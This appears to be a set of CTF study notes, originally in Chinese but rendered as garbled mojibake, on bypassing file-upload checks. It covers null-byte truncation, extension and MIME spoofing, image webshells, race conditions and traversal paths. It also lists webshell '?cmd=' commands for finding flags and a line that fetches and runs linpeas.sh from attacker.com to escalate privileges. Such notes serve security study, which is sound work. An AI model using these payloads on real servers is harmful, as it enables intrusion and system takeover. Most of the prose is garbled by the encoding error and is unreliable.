¹æ®ä½ç½®ï¼Œè®¿é—®/upload/shell.php,å³è¿›å…¥æˆ‘ä»¬æ‰€åœ¨çš„é¡µé¢ POSTä¼ å‚ä¿å­˜è·¯å¾„ ä¸GETä¼ å‚ç±»ä¼¼çš„çš„æ˜¯ï¼šåç«¯å¯¹æ–‡ä»¶è·¯å¾„çš„å¤„ç†ç±»ä¼¼ä¸º $des = $_POST[road] . /å¯¹æ–‡ä»¶åçš„å¤„ç†æ“ä½œ...... . $ext; æ­¤æ—¶roadä¸ºæˆ‘ä»¬å¯æ§çš„å‚æ•°ï¼Œä½†ä¸GETä¼ å‚ä¸åŒçš„æ˜¯ï¼Œhttpè¯·æ±‚å†…åŒ…å«æ–‡ä»¶æ—¶ï¼ŒPOSTå‚æ•°ä¸å†è¢«è‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥POSTä¼ å‚éœ€è¦ä½¿ç”¨BPä½¿ç”¨æŸ¥çœ‹16è¿›åˆ¶çš„è¯·æ±‚è¯¦æƒ…ï¼Œä¿®æ”¹ä¸€ä¸ªåå…­è¿›åˆ¶çš„ä¸º00 æ­¥éª¤ä¸€ï¼šä¿®æ”¹è·¯å¾„æ·»åŠ æ–‡ä»¶åï¼Œå†™å…¥éœ€è¦æ‰§è¡Œçš„ä»£ç è¯­å¥ æ­¥éª¤äºŒï¼šåˆ‡æ¢ä¸ºåå…­è¿›åˆ¶æ¨¡å¼ï¼Œä¿®æ”¹æ‰€éœ€è¦æ›¿æ¢ä¸º00çš„ä½ç½® ç”±äºä½¿ç”¨00æˆªæ–­ï¼Œæ‰€ä»¥æœ€åæ–‡ä»¶ä¿å­˜åœ¨/var/www/html/upload,åä¸ºtest.php,æ ¹æ®ä½ç½®ï¼Œè®¿é—®/upload/test.php,å³è¿›å…¥æˆ‘ä»¬æ‰€åœ¨çš„é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°PHPçš„é…ç½®ä¿¡æ¯ï¼Œ00æˆªæ–­æˆåŠŸ ä¾‹é¢˜ CTFHUB-æŠ€èƒ½æ ‘-WEB-æ–‡ä»¶ä¸Šä¼ -00æˆªæ–­ æŸ¥çœ‹é¡µé¢æºä»£ç å‘ç°åç«¯çš„æºç  if (!empty($_POST[submit])) $name = basename($_FILES[file][name]); $info = pathinfo($name); $ext = $info[extension]; $whitelist = array(jpg, png, gif); if (in_array($ext, $whitelist)) $des = $_GET[road] . / . rand(10, 99) . date(YmdHis) . . . $ext; if (move_uploaded_file($_FILES[file][tmp_name], $des)) echo scriptalert(ä¸Šä¼ æˆåŠŸ)/script; else echo scriptalert(ä¸Šä¼ å¤±è´¥)/script; else echo æ–‡ä»¶ç±»å‹ä¸åŒ¹é…; æœ€å…³é”®çš„æ˜¯è¿™å¥ä»£ç ï¼š $des = $_GET['road'] . / . rand(10, 99) . date(YmdHis) . . . $ext; payloadï¼š ?road=/var/www/html/upload/test1.php%00 åç«¯æ£€æµ‹_åç¼€åæ£€æµ‹æ¼æ´ åŸç† é€šå¸¸æ˜¯é’ˆå¯¹æ–‡ä»¶çš„æ‰©å±•ååç¼€è¿›è¡Œæ£€æµ‹ï¼Œä¸»è¦æ˜¯é€šè¿‡é»‘ç™½åå•è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå¦‚æœä¸ç¬¦å…¨è¿‡æ»¤è§„åˆ™åˆ™ä¸å…è®¸ä¸Šä¼  é»‘åå• ä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„ blacklist æ–‡ä»¶ï¼Œé‡Œé¢ä¼šåŒ…å«å¸¸è§çš„å±é™©è„šæœ¬æ–‡ä»¶ ç»•è¿‡ è§£ææ¼æ´ .htaccessæ–‡ä»¶è§£ææ¼æ´- apacheè§£ææ¼æ´ IIS7.0 | IIS7.5 | Nginxçš„è§£ææ¼æ´ IIS6.0è§£ææ¼æ´ æˆªæ–­ä¸Šä¼  æˆªæ–­ç±»å‹:PHP%00æˆªæ–­ æˆªæ–­åŸç†:ç”±äº00ä»£è¡¨ç»“æŸç¬¦,æ‰€ä»¥ä¼šæŠŠ00åé¢çš„æ‰€æœ‰å­—ç¬¦éƒ½æˆªæ–­ æˆªæ–­æ¡ä»¶:PHPç‰ˆæœ¬å°äº5.3.4,PHPçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ [!IMPORTANT] magic_quotes_gpc å…¨ç§° Magic Quotes for GET, POST, COOKIEï¼Œæ˜¯ PHP æ—©æœŸç‰ˆæœ¬ï¼ˆPHP 4.0.0 è‡³ PHP 5.4.0ï¼‰æä¾›çš„ è‡ªåŠ¨è½¬ä¹‰ æœºåˆ¶ è‡ªåŠ¨ç»™ $_GETã€$_POSTã€$_COOKIE è¿™äº›å…¨å±€å˜é‡ä¸­çš„ å•å¼•å· 'ã€åŒå¼•å· ã€åæ–œæ  \\ã€NULL æ·»åŠ  **åæ–œæ  \\**è¿›è¡Œè½¬ä¹‰ï¼Œä»¥å‡å°‘ SQL æ³¨å…¥çš„é£é™© å¤§å°å†™ç»•è¿‡ æ¯”å¦‚ï¼šaSpå’ŒpHpä¹‹ç±» é»˜è®¤æƒ…å†µä¸‹ï¼Œæ­£åˆ™åŒ¹é…æ˜¯åŒºåˆ†å¤§å°å†™çš„ $pattern = /\\b( . implode(|, $blacklist) . )\\b/i; // åŠ  i ä½¿åŒ¹é…å¤§å°å†™å¿½ç•¥ åŒå†™ç»•è¿‡ æœ‰æ—¶åç«¯ä¼šæŠŠæ•æ„Ÿå­—ç¬¦æ›¿æ¢ä¸ºç©ºï¼Œè¿™å°±å¯ä»¥åŒå†™ç»•è¿‡äº†ï¼Œæ¯”å¦‚name.phphpp é»‘åå•çš„æ¼ç½‘ä¹‹é±¼ asaå’Œcerä¹‹ç±» asp: asa cer aspx jsp: jspx jspf php: php php3 php4 php5 phtml pht exe: exee åˆ©ç”¨Windowsçš„å‘½åæœºåˆ¶ shell.php. shell.phpç©ºæ ¼ shell.php:1.jpg shell. php::$DATA shell.php:1.jpg åœ¨windowsä¸­ï¼Œåç¼€ååé¢çš„ç‚¹å’Œç©ºæ ¼éƒ½ä¼šè¢«åˆ é™¤æ‰ æ³¨ï¼š::$DATA æ˜¯**Windows NTFS æ•°æ®æµï¼ˆAlternate Data Streams, ADSï¼‰**çš„ç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æŸ¥ï¼Œç”šè‡³æ‰§è¡Œæ¶æ„ä»£ç  shell.php:1.jpgï¼šæ˜¯ä¸€ç§åˆ©ç”¨ åŒæ‰©å±•å å’Œ NTFS æ•°æ®æµ çš„æ”»å‡»æ–¹æ³•ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ NTFS æ•°æ®æµï¼ˆAlternate Data Streams, ADSï¼‰ ç»•è¿‡æ–‡ä»¶ä¸Šä¼ æ£€æµ‹å¹¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ ç™½åå• ä¸€èˆ¬æœ‰ä¸ªä¸“é—¨çš„ whitelist æ–‡ä»¶ï¼Œé‡Œé¢ä¼šåŒ…å«çš„æ­£å¸¸æ–‡ä»¶ ç»•è¿‡åŒé»‘åå• åç«¯æ£€æµ‹_MIMEæ£€æµ‹ åŸºç¡€ ä»€ä¹ˆæ˜¯MIME MIME(Multipurpose Internet Mail Extensions)å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åçš„æ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šåº”ç”¨ç¨‹åºæ¥æ‰“å¼€ å¸¸è§çš„MIMEç±»å‹ text/plain ï¼ˆçº¯æ–‡æœ¬ï¼‰ text/html ï¼ˆHTMLæ–‡æ¡£ï¼‰ text/javascript ï¼ˆjsä»£ç ï¼‰ application/xhtml+xml ï¼ˆXHTMLæ–‡æ¡£ï¼‰ image/gif ï¼ˆGIFå›¾åƒï¼‰ image/jpeg ï¼ˆJPEGå›¾åƒï¼‰ image/png ï¼ˆPNGå›¾åƒï¼‰ video/mpeg ï¼ˆMPEGåŠ¨ç”»ï¼‰ application/octet-stream ï¼ˆäºŒè¿›åˆ¶æ•°æ®ï¼‰ application/pdf ï¼ˆPDFæ–‡æ¡£ï¼‰ æ£€æµ‹æ–¹å¼ åœ¨æ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­ï¼ŒæœåŠ¡ç«¯ä¼šé’ˆå¯¹æˆ‘ä»¬çš„ä¸Šä¼ çš„æ–‡ä»¶ç”Ÿæˆä¸€ä¸ªæ•°ç»„ï¼Œè¿™ä¸ªæ•°ç»„å…¶ä¸­æœ‰ä¸€é¡¹å°±æ˜¯è¿™ä¸ªæ–‡ä»¶çš„ç±»å‹file_typeï¼›æœåŠ¡ç«¯å¯¹æ–‡ä»¶è¿›è¡Œæ£€æµ‹æ—¶ï¼Œå°±æ˜¯é€šè¿‡æ£€æµ‹è„šæœ¬ä¸­çš„é»‘ç™½åå•å’Œè¿™ä¸ªæ•°ç»„ä¸­çš„file_typeè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœç¬¦åˆè¦æ±‚å°±å…è®¸ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶ ç»•è¿‡ é€šè¿‡æŠ“åŒ…ï¼Œå°†content-typeå­—æ®µæ”¹ä¸ºå¸¸è§çš„å›¾ç‰‡ç±»å‹ï¼Œä»è€Œç»•è¿‡æ ¡éªŒ å¦‚ä¼ name.phpï¼ŒbpæŠ“åŒ…ç›´æ¥æ”¹æˆimage/pngç­‰ç­‰ åç«¯æ£€æµ‹_å†…å®¹æ£€æµ‹å›¾ç‰‡é©¬ç»•è¿‡ åŸç† ä¸€èˆ¬æ–‡ä»¶å†…å®¹éªŒè¯ä½¿ç”¨getimagesizeå‡½æ•°æ£€æµ‹,ä¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ–‡ä»¶å›¾ç‰‡,å¦‚æœæ˜¯,åˆ™å…è®¸ä¸Šä¼ ,å¦åˆ™çš„è¯ä¸å…è®¸ä¸Šä¼ ã€‚ æœ¬å®éªŒå°±æ˜¯å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ä¸€ä¸ª[åˆæ³•]çš„å›¾ç‰‡æ–‡ä»¶å½“ä¸­,ç„¶åç”¨webshellç®¡ç†å·¥å…·è¿›è¡Œè¿œç¨‹è¿æ¥ [!IMPORTANT] getimagesizeå‡½æ•° getimagesize() æ˜¯ PHP ä¸­ä¸€ä¸ªéå¸¸å¸¸ç”¨çš„å‡½æ•°ï¼Œç”¨äºè·å–å›¾åƒçš„å¤§å°å’Œç±»å‹ä¿¡æ¯ã€‚å®ƒä¸ä»…è¿”å›å›¾åƒçš„å°ºå¯¸ï¼ˆå®½åº¦å’Œé«˜åº¦ï¼‰ï¼Œè¿˜ä¼šè¿”å›å›¾åƒçš„ç±»å‹ï¼ˆå¦‚ JPGã€PNGã€GIF ç­‰ï¼‰ æˆåŠŸæ—¶ï¼Œgetimagesize() è¿”å›ä¸€ä¸ªåŒ…å«ä»¥ä¸‹ä¿¡æ¯çš„æ•°ç»„ï¼š ç´¢å¼• æè¿° 0 å›¾åƒçš„å®½åº¦ï¼ˆæ•´æ•°å€¼ï¼‰ 1 å›¾åƒçš„é«˜åº¦ï¼ˆæ•´æ•°å€¼ï¼‰ 2 å›¾åƒç±»å‹ï¼ˆå¸¸è§ç±»å‹ï¼šIMAGETYPE_JPEGï¼ˆ2ï¼‰ã€IMAGETYPE_PNG ï¼ˆ3ï¼‰ç­‰ï¼‰ 3 ç”¨äº HTML çš„å›¾åƒå¤§å°å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚ï¼šwidth=300 height=200ï¼‰ â€˜mimeâ€™ å›¾åƒçš„ MIME ç±»å‹ï¼ˆä¾‹å¦‚ï¼šimage/jpegï¼‰ å›¾ç‰‡é©¬ cmdä¸­ copy a.png /b + a.php /a 3.php /b:æŒ‡å®šä»¥äºŒè¿›åˆ¶æ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ï¼Œç”¨äºå›¾åƒæˆ–è€…å£°éŸ³ç±»æ–‡ä»¶ /a:æŒ‡å®šä»¥asciiæ ¼å¼å¤åˆ¶ã€åˆå¹¶æ–‡ä»¶ç”¨äºtxtç­‰æ–‡æœ¬ç±»æ–‡ä»¶ è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯ï¼šé€šè¿‡copyå‘½ä»¤ï¼ŒæŠŠa.pngå›¾ç‰‡æ–‡ä»¶ï¼Œä»¥äºŒè¿›åˆ¶æ–‡ä»¶å½¢å¼æ·»åŠ åˆ°a.phpæ–‡ä»¶ä¸­ï¼Œä»¥ASCIIæ–‡æœ¬æ–‡ä»¶å½¢å¼è¾“å‡ºä¸º3.phpæ–‡ä»¶ ä¸€èˆ¬è§£æå›¾ç‰‡é©¬éœ€è¦ç»“åˆè§£ææ¼æ´æˆ–è€…æ–‡ä»¶åŒ…å«æ‰èƒ½è§£æå›¾ç‰‡é©¬ æ³¨ï¼šå›¾ç‰‡é©¬å¸¸å¸¸ä¸æ–‡ä»¶åŒ…å«æ¼æ´æœ‰å…³ï¼Œä¸€æ—¦æ”»å‡»è€…å°†åŒ…å« PHP ä»£ç çš„å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œä»–ä»¬å¯ä»¥åˆ©ç”¨ æ–‡ä»¶åŒ…å«æ¼æ´ æ¥æ‰§è¡Œå›¾ç‰‡ä¸­çš„ PHP è„šæœ¬ æ¡ä»¶ç«äº‰æ¼æ´ åŸç† æ¡ä»¶ç«äº‰æ¼æ´æ˜¯ä¸€ç§æœåŠ¡å™¨ç«¯çš„æ¼æ´ï¼Œç”±äºæœåŠ¡å™¨ç«¯åœ¨å¤„ç†ä¸åŒç”¨æˆ·çš„è¯·æ±‚æ—¶æ˜¯å¹¶å‘è¿›è¡Œçš„ï¼Œå› æ­¤ï¼Œå¦‚æœå¹¶å‘å¤„ç†ä¸å½“æˆ–ç›¸å…³æ“ä½œé€»è¾‘é¡ºåºè®¾è®¡çš„ä¸åˆç†æ—¶ï¼Œå°†ä¼šå¯¼è‡´æ­¤ç±»é—®é¢˜çš„å‘ç”Ÿ å¤§ç™½è¯ï¼šå¡ç©ºå­ã€‚å½“æ–‡ä»¶çš„åˆ¤æ–­éœ€è¦è¿‡å¤šçš„æ—¶é—´æ—¶ï¼Œå¯ä»¥å¡é‚£ä¸ªæ—¶é—´é—´éš”æ‰§è¡Œæœ¨é©¬ åˆ©ç”¨ ä¸Šä¼ æ–‡ä»¶æºä»£ç é‡Œæ²¡æœ‰æ ¡éªŒä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ–‡ä»¶ç›´æ¥ä¸Šä¼ ï¼Œä¸Šä¼ æˆåŠŸåæ‰è¿›è¡Œåˆ¤æ–­ï¼šå¦‚æœæ–‡ä»¶æ ¼å¼ç¬¦åˆè¦æ±‚ï¼Œåˆ™é‡å‘½åï¼Œå¦‚æœæ–‡ä»¶æ ¼å¼ä¸ç¬¦åˆè¦æ±‚ï¼Œå°†æ–‡ä»¶åˆ é™¤ ç”±äºæœåŠ¡å™¨å¹¶å‘å¤„ç†(åŒæ—¶)å¤šä¸ªè¯·æ±‚ï¼Œå‡å¦‚aç”¨æˆ·ä¸Šä¼ äº†æœ¨é©¬æ–‡ä»¶ï¼Œç”±äºä»£ç æ‰§è¡Œéœ€è¦æ—¶é—´ï¼Œåœ¨æ­¤è¿‡ç¨‹ä¸­bç”¨æˆ·è®¿é—®äº†aç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œä¼šæœ‰ä»¥ä¸‹ä¸‰ç§æƒ…å†µï¼š 1.è®¿é—®æ—¶é—´ç‚¹åœ¨ä¸Šä¼ æˆåŠŸä¹‹å‰ï¼Œæ²¡æœ‰æ­¤æ–‡ä»¶ã€‚ 2.è®¿é—®æ—¶é—´ç‚¹åœ¨åˆšä¸Šä¼ æˆåŠŸä½†è¿˜æ²¡æœ‰è¿›è¡Œåˆ¤æ–­ï¼Œè¯¥æ–‡ä»¶å­˜åœ¨ã€‚ 3.è®¿é—®æ—¶é—´ç‚¹åœ¨åˆ¤æ–­ä¹‹åï¼Œæ–‡ä»¶è¢«åˆ é™¤ï¼Œæ²¡æœ‰æ­¤æ–‡ä»¶ã€‚ äºŒæ¬¡æ¸²æŸ“æ¼æ´ åŸç† åœ¨æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶åï¼Œç½‘ç«™ä¼šå¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡å¤„ç†ï¼ˆæ ¼å¼ã€å°ºå¯¸è¦æ±‚ç­‰ï¼‰ï¼ŒæœåŠ¡å™¨ä¼šæŠŠé‡Œé¢çš„å†…å®¹è¿›è¡Œæ›¿æ¢æ›´æ–°ï¼Œå¤„ç†å®Œæˆåï¼Œæ ¹æ®æˆ‘ä»¬åŸæœ‰çš„å›¾ç‰‡ç”Ÿæˆä¸€ä¸ªæ–°çš„å›¾ç‰‡å¹¶æ”¾åˆ°ç½‘ç«™å¯¹åº”çš„æ ‡ç­¾è¿›è¡Œæ˜¾ç¤º ç»•è¿‡ é…åˆæ–‡ä»¶åŒ…å«æ¼æ´ å°†ä¸€å¥è¯æœ¨é©¬æ’å…¥åˆ°ç½‘ç«™äºŒæ¬¡å¤„ç†åçš„å›¾ç‰‡ä¸­ï¼Œä¹Ÿå°±æ˜¯æŠŠä¸€å¥è¯æ’å…¥å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åä¼šä¿ç•™çš„é‚£éƒ¨åˆ†æ•°æ®é‡Œï¼Œç¡®ä¿ä¸ä¼šåœ¨äºŒæ¬¡å¤„ç†æ—¶åˆ é™¤æ‰ã€‚è¿™æ ·äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ä¸­å°±å­˜åœ¨äº†ä¸€å¥è¯ï¼Œåœ¨é…åˆæ–‡ä»¶åŒ…å«æ¼æ´è·å–webshell å¯ä»¥é…åˆæ¡ä»¶ç«äº‰ è¿™é‡ŒäºŒæ¬¡æ¸²æŸ“çš„é€»è¾‘å­˜åœ¨æ¼æ´ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¹‹åå†åˆ¤æ–­ï¼Œç¬¦åˆå°±ä¿å­˜ï¼Œä¸ç¬¦åˆåˆ é™¤ï¼Œå¯åˆ©ç”¨æ¡ä»¶ç«äº‰æ¥è¿›è¡Œçˆ†ç ´ä¸Šä¼  åˆ¤æ–­å›¾ç‰‡çš„äºŒæ¬¡å¤„ç† å¯¹æ¯”è¦ä¸Šä¼ å›¾ç‰‡ä¸ä¸Šä¼ åçš„å›¾ç‰‡å¤§å°ï¼Œä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€å›¾ç‰‡æŸ¥çœ‹ä¸Šä¼ åä¿ç•™äº†å“ªäº›æ•°æ®ï¼ŒæŸ¥çœ‹é‚£äº›æ•°æ®è¢«æ”¹å˜ å‚è€ƒæ–‡ç«  è¶…è¯¦ç»†æ–‡ä»¶ä¸Šä¼ æ¼æ´æ€»ç»“åˆ†æ æ–‡ä»¶ä¸Šä¼ å…¥é—¨-Pax æ–‡ä»¶ä¸Šä¼ æ¼æ´-Wells é€šè¿‡æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ‰¾flagï¼ˆç»•è¿‡åï¼‰ æ³¨ï¼šcmdä¸ºä¸Šä¼ æœ¨é©¬ä¼ çš„å‚æ•° ç¡®è®¤ Webshell æˆ–å‘½ä»¤æ‰§è¡Œæƒé™ ç”¨cmd=whoamiå‘½ä»¤ç¡®è®¤å½“å‰æƒé™ å¦‚æœè¿”å› rootï¼Œè¯´æ˜ä½ æœ‰æœ€é«˜æƒé™ï¼Œå¯ä»¥ç›´æ¥æŸ¥æ‰¾ flagã€‚ å¦‚æœè¿”å›æ™®é€šç”¨æˆ·ï¼ˆå¦‚ www-data æˆ– apacheï¼‰ï¼Œä½ å¯èƒ½éœ€è¦è¿›ä¸€æ­¥ææƒ æŸ¥æ‰¾ flag çš„å¸¸è§ä½ç½® flag é€šå¸¸ä½äºä»¥ä¸‹ç›®å½•æˆ–æ–‡ä»¶ä¸­ï¼š /flag /root/flag /home/flag /var/www/flag /tmp/flag å½“å‰ç”¨æˆ·çš„ä¸»ç›®å½•ï¼ˆå¦‚ /home/username/flagï¼‰ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾ flagï¼š ?cmd=find / -name flag 2/dev/null 2/dev/nullï¼šå¿½ç•¥æƒé™é”™è¯¯ï¼ˆé¿å…è¾“å‡ºè¿‡å¤šæ— ç”¨ä¿¡æ¯ï¼‰ å¦‚æœæŸ¥æ‰¾ä¸åˆ°ï¼Œåœ¨flagå‰åéƒ½åŠ *æ¥è¡¨ç¤ºæ–‡ä»¶ååŒ…å« â€œflagâ€ çš„æ–‡ä»¶ æ£€æŸ¥å½“å‰ç›®å½• å…ˆç”¨?cmd=ls /ï¼Œå†ä¸€æ­¥æ­¥æŸ¥æ‰¾flag ä¸è¡Œçš„è¯å°±ç”¨ï¼š ?cmd=ls -la ls -laï¼šåˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬éšè—æ–‡ä»¶ï¼‰ ?cmd=ls -la / åˆ—å‡ºæ ¹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ å¦‚æœå‘ç°å¯ç–‘æ–‡ä»¶ï¼ˆå¦‚ flag.txt æˆ– .flagï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ cat å‘½ä»¤æŸ¥çœ‹å†…å®¹ æ£€æŸ¥ç¯å¢ƒå˜é‡ æœ‰æ—¶ flag å¯èƒ½å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ï¼š ?cmd=env æŸ¥æ‰¾è¾“å‡ºä¸­æ˜¯å¦åŒ…å« FLAG æˆ– flag ç›¸å…³çš„å˜é‡ æ£€æŸ¥è¿›ç¨‹æˆ–æœåŠ¡ å¦‚æœ flag è¢«æŸä¸ªè¿›ç¨‹æˆ–æœåŠ¡ä½¿ç”¨ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤æŸ¥æ‰¾ï¼š ?cmd=ps aux æŸ¥æ‰¾å¯ç–‘è¿›ç¨‹ï¼Œç‰¹åˆ«æ˜¯é‚£äº›å¯èƒ½åŒ…å« flag çš„å‘½ä»¤æˆ–å‚æ•° æ£€æŸ¥æ–‡ä»¶å†…å®¹ å¦‚æœ flag è¢«éšè—åœ¨æŸä¸ªæ–‡ä»¶ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ grep å‘½ä»¤æœç´¢æ–‡ä»¶å†…å®¹ï¼š ?cmd=grep -r flag / 2/dev/null -rï¼šé€’å½’æœç´¢ç›®å½•ã€‚ flagï¼šæœç´¢åŒ…å« flag çš„å­—ç¬¦ä¸²ï¼ˆCTF ä¸­ flag é€šå¸¸ä»¥ flag å¼€å¤´ï¼‰ã€‚ /ï¼šä»æ ¹ç›®å½•å¼€å§‹æœç´¢ æ£€æŸ¥æ•°æ®åº“ å¦‚æœç›®æ ‡æ˜¯ä¸€ä¸ª Web åº”ç”¨ï¼Œflag å¯èƒ½å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ã€‚å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤æŸ¥æ‰¾ï¼š æ‰¾åˆ°æ•°æ®åº“é…ç½®æ–‡ä»¶ï¼ˆå¦‚ config.php æˆ– .envï¼‰ï¼Œè·å–æ•°æ®åº“å‡­æ®ã€‚ ä½¿ç”¨æ•°æ®åº“å®¢æˆ·ç«¯ï¼ˆå¦‚ mysqlï¼‰è¿æ¥æ•°æ®åº“ï¼š mysql -u username -p -h localhost æŸ¥æ‰¾ flagï¼š SHOW DATABASES;USE target_database;SHOW TABLES;SELECT * FROM suspicious_table; æ£€æŸ¥å¤‡ä»½æ–‡ä»¶ æœ‰æ—¶ flag å¯èƒ½å­˜åœ¨äºå¤‡ä»½æ–‡ä»¶ä¸­ã€‚å¯ä»¥æŸ¥æ‰¾å¸¸è§çš„å¤‡ä»½æ–‡ä»¶ï¼š find / -name *.bak 2/dev/nullfind / -name *.backup 2/dev/null æ£€æŸ¥æ—¥å¿—æ–‡ä»¶ flag å¯èƒ½è¢«è®°å½•åœ¨æ—¥å¿—æ–‡ä»¶ä¸­ã€‚å¯ä»¥æ£€æŸ¥ä»¥ä¸‹æ—¥å¿—æ–‡ä»¶ï¼š /var/log/apache2/access.log /var/log/nginx/access.log /var/log/auth.log ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ï¼š cat /var/log/apache2/access.log | grep flag ææƒï¼ˆå¦‚æœéœ€è¦ï¼‰ å¦‚æœä½ å½“å‰æƒé™ä¸è¶³ï¼Œå¯ä»¥å°è¯•ææƒï¼š 1.æŸ¥æ‰¾å…·æœ‰ SUID æˆ– SGID æƒé™çš„æ–‡ä»¶ï¼š find / -perm -u=s -o -perm -g=s 2/dev/null 2.åˆ©ç”¨å·²çŸ¥æ¼æ´ææƒï¼ˆå¦‚è„ç‰›æ¼æ´ï¼‰ï¼š searchsploit linux kernel 3.ä¸Šä¼ ææƒå·¥å…·ï¼ˆå¦‚ linpeas.shï¼‰å¹¶è¿è¡Œï¼š wget http://attacker.com/linpeas.shchmod +x linpeas.sh./linpeas.sh è¯»å– flag cat /path/to/flag å†¬ä»¤è¥ä¸€äº›é—®é¢˜ å­¦ä¹ ä¸€ä¸‹eval()çš„ç”¨æ³•ï¼Œä»€ä¹ˆå«åšå°†å­—ç¬¦ä¸²ä½œä¸ºphpä»£ç æ‰§è¡Œï¼ˆç•™æ„å‡ ä¸ªé—®é¢˜ï¼Œå•åŒå¼•å·è½¬ä¹‰é—®é¢˜ä»¥åŠè¯­å¥æœ«å°¾éœ€è¦åˆ†å·çš„é—®é¢˜éƒ½æ˜¯æ–°æ‰‹å¾ˆç»å¸¸ç¢°åˆ°çš„ï¼‰ eval() åœ¨ PHP ä¸­çš„ä½œç”¨æ˜¯å°†å­—ç¬¦ä¸²ä½œä¸º PHP ä»£ç æ‰§è¡Œ eval() å¸¸è§å‘ å•åŒå¼•å·è½¬ä¹‰é—®é¢˜ ç”¨ \\ å¤„ç†åŒå¼•å· ç”¨ \\' å¤„ç†å•å¼•å· ç”¨ addslashes() è‡ªåŠ¨è½¬ä¹‰ è¯­å¥æœ«å°¾å¿…é¡»æœ‰åˆ†å· (;) å˜é‡æ›¿æ¢é—®é¢˜ ç”¨å­—ç¬¦ä¸²æ‹¼æ¥ å‰ç«¯çš„è¿‡æ»¤æ€ä¹ˆç»•è¿‡ï¼Ÿ ç¦ç”¨ JSï¼Œä¿®æ”¹ HTMLï¼Œç›´æ¥æ„é€ è¯·æ±‚ ä¿®æ”¹ MIME ç±»å‹ï¼ŒåŒå†™æ–‡ä»¶åç¼€ ç»“åˆ .htaccess è®©é PHP æ–‡ä»¶ä¹Ÿèƒ½æ‰§è¡Œ .htaccessæ˜¯åšä»€ä¹ˆçš„ï¼Œåœ¨ä»€ä¹ˆæœåŠ¡å™¨ä¸Šï¼ˆapache or nginx?ï¼‰ç”Ÿæ•ˆï¼Œä½¿ç”¨phpstudyä¸‹è½½ä¸€ä¸ªapache/nginxæµ‹è¯•æµ‹è¯•ï¼Œæ­å»ºèµ·ä½ çš„webæœåŠ¡å™¨æµ‹è¯•æµ‹è¯• .htaccess æ˜¯ Apache Web æœåŠ¡å™¨ çš„ç›®å½•çº§é…ç½®æ–‡ä»¶ï¼Œç”¨äºæ§åˆ¶è®¿é—®æƒé™ã€URL é‡å†™ã€MIME ç±»å‹ã€æ–‡ä»¶æ‰§è¡Œæƒé™ç­‰ã€‚ å®ƒ ä»…åœ¨ Apache æœåŠ¡å™¨ä¸Šç”Ÿæ•ˆï¼Œåœ¨ Nginx æœåŠ¡å™¨æ— æ•ˆï¼ˆNginx ä½¿ç”¨ nginx.conf è¿›è¡Œé…ç½®ï¼‰ .user.iniæ˜¯åšä»€ä¹ˆçš„https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.htmlï¼Œç›®å½•ä¸‹çš„phpæ–‡ä»¶æ˜¯å¿…é¡»çš„ ç›®å½•ç©¿è¶Šå¯¼è‡´çš„æ–‡ä»¶ä¸Šä¼  ç›®å½•ç©¿è¶Šç»•è¿‡æ–¹æ³• åŒå†™ ..// ..//..//..//../var/www/html/shell.php URL ç¼–ç ç»•è¿‡ ..%2F..%2F..%2F..%2Fvar/www/html/shell.php æœåŠ¡å™¨å¯èƒ½æœªå¯¹ %2Fï¼ˆURL ç¼–ç çš„ /ï¼‰è¿›è¡Œè¿‡æ»¤ï¼Œä»ç„¶è§£æç›®å½•ç©¿è¶Š åŒé‡ï¼š %252e%252e%252f%252e%252e%252fshell.php æˆªæ–­ç»•è¿‡ 